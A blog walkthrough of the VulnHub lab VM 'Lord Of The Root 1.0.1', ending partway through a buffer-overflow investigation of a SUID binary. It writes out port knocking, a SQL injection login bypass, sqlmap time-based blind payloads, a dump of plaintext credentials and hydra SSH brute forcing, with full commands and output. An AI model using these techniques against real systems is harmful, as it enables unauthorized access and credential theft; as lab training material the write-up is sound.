---
layout: post
title: "Lord Of The Root: 1.0.1"
date: 2019-05-06 19:35:57 +0000
author: Larry Brown
category: Walkthroughs
tags: [vulnhub, port knock, sqli, sqlmap, gdb, pwndbg, buffer overflow]
---
<div>VulnHub URL:Â <a href="https://www.vulnhub.com/entry/lord-of-the-root-101,129/" target="_blank">https://www.vulnhub.com/entry/lord-of-the-root-101,129/</a></div>
<div>Hostname:Â LordOfTheRoot</div>
<div>IP Address:Â 10.183.0.214</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Information Gathering/Recon</h2>
</div>
<div><br /></div>
<div>The IP address is obtained via DHCP at boot. In my case, the IP is 10.183.0.214.</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Service Enumeration/Scanning</h2>
</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/lordoftheroot# nmap -Pn -sT -sV -sC -A -oA lordoftheroot -p 1-65535 10.183.0.214</div>
    <div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-08 13:48 EDT</div>
    <div>Nmap scan report for LordOfTheRoot.homenet.dom (10.183.0.214)</div>
    <div>Host is up (0.0016s latency).</div>
    <div>Not shown: 65534 filtered ports</div>
    <div>PORTÂ Â Â STATE SERVICE VERSION</div>
    <div>
        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">22/tcp openÂ Â sshÂ Â Â Â Â OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)</font>
    </div>
    <div>| ssh-hostkey: </div>
    <div>|Â Â Â 1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)</div>
    <div>|Â Â Â 2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)</div>
    <div>|Â Â Â 256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)</div>
    <div>|_Â Â 256 34:ec:16:dd:a7:cf:2a:86:45:ec:65:ea:05:43:89:21 (ED25519)</div>
    <div>MAC Address: 08:00:27:64:93:94 (Oracle VirtualBox virtual NIC)</div>
    <div>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</div>
    <div>Device type: general purpose</div>
    <div>Running: Linux 3.X|4.X</div>
    <div>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</div>
    <div>OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9</div>
    <div>Network Distance: 1 hop</div>
    <div>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
    <div>
        <div><br /></div>
    </div>
    <div>TRACEROUTE</div>
    <div>HOP RTTÂ Â Â Â Â ADDRESS</div>
    <div>1Â Â Â 1.61 ms LordOfTheRoot.homenet.dom (10.183.0.214)</div>
    <div>
        <div><br /></div>
    </div>
    <div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div>
    <div>Nmap done: 1 IP address (1 host up) scanned in 110.62 seconds</div>
</div>
<div><br /></div>
<!--more-->
<div><br /></div>
<div>
    <h2>Gaining Access</h2>
</div>
<div><br /></div>
<div>Well, nmap sure didn't find much open. The only service available is a SSH service on TCP port 22. However, when we connect to the service, we get a helpful "hint"...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/lordoftheroot# ssh root@10.183.0.214</div>
    <div>The authenticity of host '10.183.0.214 (10.183.0.214)' can't be established.</div>
    <div>ECDSA key fingerprint is SHA256:XzDLUMxo8ifHi4SciYJYj702X3PfFwaXyKOS07b6xd8.</div>
    <div>Are you sure you want to continue connecting (yes/no)? yes</div>
    <div>Warning: Permanently added '10.183.0.214' (ECDSA) to the list of known hosts.</div>
    <div>
        <div><br /></div>
        <div><br /></div>
    </div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â .____Â Â Â Â _____________________________</div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â |Â Â Â Â |Â Â Â \_____Â Â \__Â Â Â Â ___/\______Â Â Â \</div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â |Â Â Â Â |Â Â Â Â /Â Â Â |Â Â Â \|Â Â Â Â |Â Â Â Â |Â Â Â Â Â Â Â _/</div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â |Â Â Â Â |___/Â Â Â Â |Â Â Â Â \Â Â Â Â |Â Â Â Â |Â Â Â Â |Â Â Â \</div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â |_______ \_______Â Â /____|Â Â Â Â |____|_Â Â /</div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \/Â Â Â Â Â Â Â \/Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \/</div>
    <div> ____Â Â __.Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â __Â Â Â Â Â ___________Â Â Â Â Â Â .__Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â .___ ___________Â Â Â Â Â Â ___________Â Â Â Â Â Â Â __</div>
    <div>|Â Â Â Â |/ _| ____Â Â Â ____Â Â Â ____ |Â Â | __ \_Â Â Â _____/______|__| ____Â Â Â ____Â Â Â Â __| _/ \__Â Â Â Â ___/___Â Â Â \_Â Â Â _____/ _____/Â Â |_Â Â ___________</div>
    <div>|Â Â Â Â Â Â &lt;Â Â /Â Â Â Â \ /Â Â _ \_/ ___\|Â Â |/ /Â Â |Â Â Â Â __) \_Â Â __ \Â Â |/ __ \ /Â Â Â Â \Â Â / __ |Â Â Â Â |Â Â Â Â | /Â Â _ \Â Â Â |Â Â Â Â __)_ /Â Â Â Â \Â Â Â __\/ __ \_Â Â __ \</div>
    <div>|Â Â Â Â |Â Â \|Â Â Â |Â Â (Â Â &lt;_&gt; )Â Â \___|Â Â Â Â &lt;Â Â Â |Â Â Â Â Â \Â Â Â |Â Â | \/Â Â \Â Â ___/|Â Â Â |Â Â \/ /_/ |Â Â Â Â |Â Â Â Â |(Â Â &lt;_&gt; )Â Â |Â Â Â Â Â Â Â Â \Â Â Â |Â Â \Â Â | \Â Â ___/|Â Â | \/</div>
    <div>|____|__ \___|Â Â /\____/ \___Â Â &gt;__|_ \Â Â \___Â Â /Â Â Â |__|Â Â |__|\___Â Â &gt;___|Â Â /\____ |Â Â Â Â |____| \____/Â Â /_______Â Â /___|Â Â /__|Â Â \___Â Â &gt;__|</div>
    <div>Â Â Â Â Â Â Â Â \/Â Â Â Â \/Â Â Â Â Â Â Â Â Â Â Â Â \/Â Â Â Â Â \/Â Â Â Â Â Â \/Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \/Â Â Â Â Â \/Â Â Â Â Â Â \/Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \/Â Â Â Â Â \/Â Â Â Â Â Â Â Â Â Â \/</div>
    <div>Easy as 1,2,3</div>
    <div>root@10.183.0.214's password:</div>
</div>
<div><br /></div>
<div>Clever. I'll use the knockd client 'knock' to knock on TCP ports 1, 2 and 3 and rescan.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/lordoftheroot# knock 10.183.0.214 1 2 3</div>
    <div>root@kali:~/Walkthroughs/lordoftheroot# nmap -Pn -sT -sV -sC -A -oA lordoftheroot-post -p 1-65535 10.183.0.214</div>
    <div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-08 14:26 EDT</div>
    <div>Nmap scan report for LordOfTheRoot.homenet.dom (10.183.0.214)</div>
    <div>Host is up (0.0013s latency).</div>
    <div>Not shown: 65533 filtered ports</div>
    <div>PORTÂ Â Â Â Â STATE SERVICE VERSION</div>
    <div>
        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">22/tcpÂ Â Â openÂ Â sshÂ Â Â Â Â OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)</font>
    </div>
    <div>| ssh-hostkey: </div>
    <div>|Â Â Â 1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)</div>
    <div>|Â Â Â 2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)</div>
    <div>|Â Â Â 256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)</div>
    <div>|_Â Â 256 34:ec:16:dd:a7:cf:2a:86:45:ec:65:ea:05:43:89:21 (ED25519)</div>
    <div>
        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">1337/tcp openÂ Â httpÂ Â Â Â Apache httpd 2.4.7 ((Ubuntu))</font>
    </div>
    <div>|_http-server-header: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.4.7</font> (Ubuntu)</div>
    <div>|_http-title: Site doesn't have a title (text/html).</div>
    <div>MAC Address: 08:00:27:64:93:94 (Oracle VirtualBox virtual NIC)</div>
    <div>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</div>
    <div>Device type: general purpose</div>
    <div>Running: Linux 3.X|4.X</div>
    <div>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</div>
    <div>OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4</div>
    <div>Network Distance: 1 hop</div>
    <div>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
    <div>
        <div><br /></div>
    </div>
    <div>TRACEROUTE</div>
    <div>HOP RTTÂ Â Â Â Â ADDRESS</div>
    <div>1Â Â Â 1.29 ms LordOfTheRoot.homenet.dom (10.183.0.214)</div>
    <div>
        <div><br /></div>
    </div>
    <div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div>
    <div>Nmap done: 1 IP address (1 host up) scanned in 118.99 seconds</div>
</div>
<div><br /></div>
<div>Retrieving the default page using curl, we only have a single image displayed.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/lordoftheroot# curl http://10.183.0.214:1337</div>
    <div>&lt;html&gt;</div>
    <div>&lt;img src="/images/iwilldoit.jpg" align="middle"&gt;</div>
    <div>&lt;/html&gt;</div>
</div>
<div><br /></div>
<div>Downloading the image and checking for embedded info doesn't result in anything. Next, I try to pull down robots.txt.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/lordoftheroot# curl http://10.183.0.214:1337/robots.txt</div>
    <div>&lt;html&gt;</div>
    <div>&lt;img src="/images/hipster.jpg" align="middle"&gt;</div>
    <div>&lt;!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&gt;</div>
    <div>&lt;/html&gt;</div>
</div>
<div><br /></div>
<div>Interesting. The "comment" has an encoded string. Let's try to base64 decode it.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/lordoftheroot# echo 'THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh' | base64 -d</div>
    <div>Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!</div>
    <div>root@kali:~/Walkthroughs/lordoftheroot# echo 'Lzk3ODM0NTIxMC9pbmRleC5waHA=' | base64 -d</div>
    <div>/978345210/index.php</div>
</div>
<div><br /></div>
<div>OK. We decoded the first string which gave us a second string to decode. The second string gives us a URL to try.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/lordoftheroot# curl http://10.183.0.214:1337/978345210/index.php</div>
    <div>&lt;!DOCTYPE html&gt;</div>
    <div>&lt;html&gt;</div>
    <div>&lt;head&gt;</div>
    <div>&lt;title&gt;LOTR Login!&lt;/title&gt;</div>
    <div>&lt;/head&gt;</div>
    <div>&lt;body&gt;</div>
    <div>&lt;div id="main"&gt;</div>
    <div>&lt;h1&gt;Welcome to the Gates of Mordor&lt;/h1&gt;</div>
    <div>&lt;div id="login"&gt;</div>
    <div>&lt;form action="" method="post"&gt;</div>
    <div>&lt;label&gt;User :&lt;/label&gt;</div>
    <div>
        <div>&lt;input id="name" name="username" placeholder="username" type="text"&gt;</div>
    </div>
    <div>&lt;label&gt;Password :&lt;/label&gt;</div>
    <div>&lt;input id="password" name="password" placeholder="**********" type="password"&gt;</div>
    <div>&lt;input name="submit" type="submit" value=" Login "&gt;</div>
    <div>&lt;span&gt;&lt;/span&gt;</div>
    <div>&lt;/form&gt;</div>
    <div>&lt;/div&gt;</div>
    <div>&lt;/div&gt;</div>
    <div>&lt;/body&gt;</div>
    <div>&lt;/html&gt;</div>
</div>
<div><br /></div>
<div><img height="248" src="/assets/images/2019-05-06-lord-of-the-root-1.0.1/D05161D1-DC3C-42F1-A5B5-D105C4992A92.png" width="918" /><br /></div>
<div><br /></div>
<div>Since we have virtually no information about the host at this point, we'll start trying to SQL injection on the username/password fields...</div>
<div><br /></div>
<div>We are able to login successfully by sending the following string in the username field (with 'test' in the password field).</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>test' UNION ALL SELECT NULL,NULL#</div>
</div>
<div><br /></div>
<div>We are redirected toÂ <a href="http://10.183.0.214:1337/978345210/profile.php">http://10.183.0.214:1337/978345210/profile.php</a>. The page contains a Legolas meme, but not much else.</div>
<div><br /></div>
<div>So, we know the login page is vulnerable to SQL injection, but how do we get something useful out of the SQL server or execute system commands?</div>
<div><br /></div>
<div>We'll turn to sqlmap to try to figure out the best possible way.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/lordoftheroot# sqlmap --har=sqlmap.log --data="username=test&amp;password=test&amp;submit=+Login+" --url="http://10.183.0.214:1337/97</div>
    <div>8345210/index.php" --banner --level=5 --risk=3 -v3 --dbms=mysql</div>
    <div>Â Â Â Â Â Â Â Â ___</div>
    <div>Â Â Â Â Â Â Â __H__</div>
    <div> ___ ___["]_____ ___ ___Â Â {1.3.4#stable}</div>
    <div>|_ -| . [(]Â Â Â Â Â | .'| . |</div>
    <div>|___|_Â Â [(]_|_|_|__,|Â Â _|</div>
    <div>Â Â Â Â Â Â |_|V...Â Â Â Â Â Â Â |_|Â Â Â http://sqlmap.org</div>
    <div>
        <div><br /></div>
    </div>
    <div>[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all a</div>
    <div>pplicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</div>
    <div>
        <div><br /></div>
    </div>
    <div>[*] starting @ 16:48:10 /2019-05-08/</div>
    <div><br /></div>
    <div>[...]</div>
    <div><br /></div>
    <div>POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] </div>
    <div>sqlmap identified the following injection point(s) with a total of 2273 HTTP(s) requests:</div>
    <div>---</div>
    <div>Parameter: username (POST)</div>
    <div>Â Â Â Â Type: time-based blind</div>
    <div>Â Â Â Â Title: MySQL &gt;= 5.0.12 AND time-based blind</div>
    <div>Â Â Â Â Payload: username=test'||(SELECT 0x4f4d4761 FROM DUAL WHERE 6814=6814 AND SLEEP(5))||'&amp;password=test&amp;submit= Login </div>
    <div>Â Â Â Â Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</div>
    <div>---</div>
    <div><br /></div>
    <div>[...]</div>
    <div><br /></div>
    <div>[17:42:13] [INFO] retrieved: 5.5.44-0ubuntu0.14.04.1</div>
    <div>[17:42:13] [DEBUG] performed 192 queries in 578.26 seconds</div>
    <div>web server operating system: Linux Ubuntu</div>
    <div>web application technology: Apache 2.4.7, PHP 5.5.9</div>
    <div>back-end DBMS operating system: Linux Ubuntu</div>
    <div>back-end DBMS: MySQL &gt;= 5.0.12</div>
    <div>banner: '5.5.44-0ubuntu0.14.04.1'</div>
    <div>[17:42:13] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.183.0.214'</div>
    <div>
        <div><br /></div>
    </div>
    <div>[*] ending @ 17:42:13 /2019-05-08/</div>
</div>
<div><br /></div>
<div>Oh, boy! A 'time-based' issue. These are incredibly difficult to handle by hand (stepping through character by character!), so we'll use sqlmap to mine out information from the server.</div>
<div><br /></div>
<div>First, let's see what databases are available.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/lordoftheroot# sqlmap --har=sqlmap.log --data="username=test&amp;password=test&amp;submit=+Login+" --url="http://10.183.0.214:1337/97</div>
    <div>8345210/index.php" -v3 --dbms=mysql --time-sec=1 --dbs</div>
    <div>[...]</div>
    <div>[18:00:19] [DEBUG] performed 133 queries in 276.20 seconds</div>
    <div>available databases [4]:</div>
    <div>[*] information_schema</div>
    <div>[*] mysql</div>
    <div>[*] performance_schema</div>
    <div>[*] Webapp</div>
</div>
<div><br /></div>
<div>As you can see, we only have one database to target (Webapp). Time to enumerate tables and columns.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/lordoftheroot# sqlmap --har=sqlmap.log --data="username=test&amp;password=test&amp;submit=+Login+" --url="http://10.183.0.214:1337/97</div>
    <div>8345210/index.php" -v3 --dbms=mysql --time-sec=1 -D Webapp --tables</div>
    <div>[...]</div>
    <div>Database: Webapp</div>
    <div>[1 table]</div>
    <div>+-------+</div>
    <div>| Users |</div>
    <div>+-------+</div>
    <div><br /></div>
    <div>root@kali:~/Walkthroughs/lordoftheroot# sqlmap --har=sqlmap.log --data="username=test&amp;password=test&amp;submit=+Login+" --url="http://10.183.0.214:1337/97</div>
    <div>8345210/index.php" -v3 --dbms=mysql --time-sec=1 -D Webapp -T Users --columns</div>
    <div>[...]</div>
    <div>Database: Webapp</div>
    <div>Table: Users</div>
    <div>[3 columns]</div>
    <div>+----------+--------------+</div>
    <div>| ColumnÂ Â Â | TypeÂ Â Â Â Â Â Â Â Â |</div>
    <div>+----------+--------------+</div>
    <div>| idÂ Â Â Â Â Â Â | int(10)Â Â Â Â Â Â |</div>
    <div>| password | varchar(255) |</div>
    <div>| username | varchar(255) |</div>
    <div>+----------+--------------+</div>
    <div><br /></div>
    <div>root@kali:~/Walkthroughs/lordoftheroot# sqlmap --har=sqlmap.log --data="username=test&amp;password=test&amp;submit=+Login+" --url="http://10.183.0.214:1337/978345210/index.php" -v3 --dbms=mysql --time-sec=1 -D Webapp -T Users -C id,username,password --dump</div>
    <div>[...]</div>
    <div>Database: Webapp</div>
    <div>Table: Users</div>
    <div>[5 entries]</div>
    <div>+----+----------+------------------+</div>
    <div>| id | username | passwordÂ Â Â Â Â Â Â Â Â |</div>
    <div>+----+----------+------------------+</div>
    <div>| 1Â Â | frodoÂ Â Â Â | iwilltakethering |</div>
    <div>| 2Â Â | smeagolÂ Â | MyPreciousR00tÂ Â Â |</div>
    <div>| 3Â Â | aragornÂ Â | AndMySwordÂ Â Â Â Â Â Â |</div>
    <div>| 4Â Â | legolasÂ Â | AndMyBowÂ Â Â Â Â Â Â Â Â |</div>
    <div>| 5Â Â | gimliÂ Â Â Â | AndMyAxeÂ Â Â Â Â Â Â Â Â |</div>
    <div>+----+----------+------------------+</div>
</div>
<div><br /></div>
<div>Well, it took a while, but we have a list of users and unencrypted passwords. Let's start logging in to the web app with each to see what happens... nothing! We get the same profile.php page for each user. Time to try these usernames and passwords on the SSH service.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/lordoftheroot# hydra -o ssh-crack -t 4 -L users -e nsr -P passwords ssh://10.183.0.214</div>
    <div>Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</div>
    <div>
        <div><br /></div>
    </div>
    <div>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-05-08 19:10:21</div>
    <div>[DATA] max 4 tasks per 1 server, overall 4 tasks, 40 login tries (l:5/p:8), ~10 tries per task</div>
    <div>[DATA] attacking ssh://10.183.0.214:22/</div>
    <div>
        <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">[22][ssh] host: 10.183.0.214Â Â Â login: smeagolÂ Â Â password: MyPreciousR00t</font>
    </div>
    <div>1 of 1 target successfully completed, 1 valid password found</div>
    <div>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-05-08 19:10:38</div>
</div>
<div><br /></div>
<div>Great! We found a login. Now we can SSH to the victim with the smeagol account and start working toward privilege escalation.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/lordoftheroot# ssh smeagol@10.183.0.214</div>
</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Maintaining Access</h2>
</div>
<div><br /></div>
<div>We have SSH access with a user's password, so we won't go through the steps of maintaining a reverse shell. In a "live" scenario we still would (in case the user changed their password or the SSH service started blocking us/was disabled).</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Privilege Escalation</h2>
</div>
<div><br /></div>
<div>Checking the os and kernel information...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>smeagol@LordOfTheRoot:~$ uname -a</div>
    <div>Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux</div>
    <div>smeagol@LordOfTheRoot:~$ cat /etc/os-release</div>
    <div>NAME="Ubuntu"</div>
    <div>VERSION="14.04.3 LTS, Trusty Tahr"</div>
    <div>ID=ubuntu</div>
    <div>ID_LIKE=debian</div>
    <div>PRETTY_NAME="Ubuntu 14.04.3 LTS"</div>
    <div>VERSION_ID="14.04"</div>
    <div>HOME_URL="http://www.ubuntu.com/"</div>
    <div>SUPPORT_URL="http://help.ubuntu.com/"</div>
    <div>BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"</div>
</div>
<div><br /></div>
<div>We have a well known and often used exploit available for the running os and kernel.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege EscalationÂ Â Â Â Â Â Â Â Â | exploits/linux/local/37292.c</div>
</div>
<div><br /></div>
<div>I copied it to my working directory and then transferred it to the victim using python's SimpleHTTPServer, compiled it and ran it. Unfortunately, it didn't work. That would have been too easy. ðŸ˜„</div>
<div><br /></div>
<div>Searching the drive for files with SUID root, we find some interesting files in /SECRET.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>smeagol@LordOfTheRoot:/SECRET$ ls -laF *</div>
    <div>door1:</div>
    <div>-rwsr-xr-x 1 root root 5150Â Sep 17Â Â 2015 file*</div>
    <div>
        <div><br /></div>
    </div>
    <div>door2:</div>
    <div>-rwsr-xr-x 1 root root 7370 Sep 17Â Â 2015 file*</div>
    <div>
        <div><br /></div>
        <div>door3:</div>
    </div>
    <div>-rwsr-xr-x 1 root root 7370Â Sep 22Â Â 2015 file*</div>
</div>
<div><br /></div>
<div>Running ltrace on each of the binaries (passing the string "test"), only the program behind door1 performs an interesting operation (strcpy) with our input.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>smeagol@LordOfTheRoot:/SECRET/door1$ ltrace -CS -n 4 ./file test</div>
